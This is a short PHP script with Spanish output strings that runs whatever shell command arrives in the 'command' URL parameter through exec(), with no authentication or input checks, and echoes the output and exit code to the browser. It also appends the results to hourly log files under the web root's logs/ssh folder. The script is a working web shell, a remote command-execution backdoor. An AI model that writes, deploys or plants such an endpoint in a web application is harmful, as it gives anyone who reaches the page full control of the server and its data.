<?php
$salida=array();
	if (isset($_GET['command']))
exec(($_GET['command']),$salida,$codigo);
$out = "";
foreach ($salida as $dato){
$out .= "<pre>$dato</pre>";
}
$out .= "<pre> El código de salida fué: ".$codigo."</pre>"; 
$filename = $_SERVER['DOCUMENT_ROOT']."/logs/ssh/".date("Y-m-d H",time()).".htm";
echo "Guardando en: ".$filename."<br/>

$out";
if (!file_exists($filename))
			$file = fopen($filename,'a+');
		else
			$file = fopen($filename,'a');
fwrite($file, $out);
fclose($file);

?>